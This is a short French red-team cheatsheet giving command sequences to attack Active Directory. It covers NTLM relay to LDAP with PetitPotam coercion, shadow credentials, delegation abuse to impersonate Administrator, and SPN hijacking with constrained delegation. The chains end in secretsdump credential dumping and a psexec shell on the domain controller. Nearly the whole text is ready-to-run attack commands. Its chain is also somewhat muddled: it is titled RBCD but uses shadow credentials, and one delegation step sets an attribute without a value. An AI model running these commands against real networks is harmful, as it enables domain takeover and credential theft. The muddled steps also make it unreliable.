---
title: "NTLM Relay to LDAP - RBCD Attack"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Cheatsheet: NTLM Relay to LDAP - RBCD Attack"
summary: "ActiveDirectory | NTLM Relay to LDAP - RBCD Attack"
tags:
  - "Active Directory"
  - "Kerberos"
  - "Red Team"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "ActiveDirectory"
ShowToc: true
TocOpen: false
---

## Conditions
- Cible avec SMB signing DISABLED
- Possibilité de coerce (PetitPotam, PrinterBug)
- LDAP signing disabled sur le DC

## Attaque
```bash
# 1. Lancer ntlmrelayx vers LDAP du DC (--remove-mic pour bypass MIC)
ntlmrelayx.py -t ldap://<DC_IP> --remove-mic -smb2support --shadow-credentials --shadow-target '<TARGET>$'

# 2. Coerce la cible (forcer l'auth NTLM)
python3 PetitPotam.py <LISTENER_IP> <TARGET_IP>

# 3. Résultat : Shadow Credential ajoutée → récupérer le TGT
# ntlmrelayx donne un pfx et un password

# 4. Utiliser le cert pour obtenir un TGT
certipy auth -pfx <target>.pfx -dc-ip <DC_IP>

# 5. RBCD pour impersonate Administrator
# Configurer la délégation
bloodyAD -d <domain> --host <DC> set object '<TARGET>$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity

# S4U2Self + S4U2Proxy
impacket-getST '<domain>/<TARGET>$' -spn cifs/<TARGET>.<domain> -impersonate Administrator -dc-ip <DC_IP>

# 6. Dump secrets
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump '<domain>/Administrator@<TARGET>.<domain>' -k -no-pass
```

## SPN Hijacking + KCD (Kerberos Constrained Delegation)
```bash
# Si on a WriteSPN sur un objet et un compte avec Constrained Delegation

# 1. Déplacer le SPN cible vers l'objet qu'on contrôle
bloodyAD -d <domain> --host <DC> set object '<CONTROLLED>$' --attr servicePrincipalName -v 'HTTP/target.domain'
# Ou retirer de la source et ajouter sur la cible

# 2. Demander un ticket via KCD
impacket-getST '<domain>/<KCD_USER>' -spn 'HTTP/target.domain' -impersonate Administrator -dc-ip <DC_IP>

# 3. Modifier le service dans le ticket
impacket-getST ... -altservice 'CIFS/<DC>.domain'

# 4. Utiliser le ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec '<domain>/Administrator@<DC>.domain' -k -no-pass
```
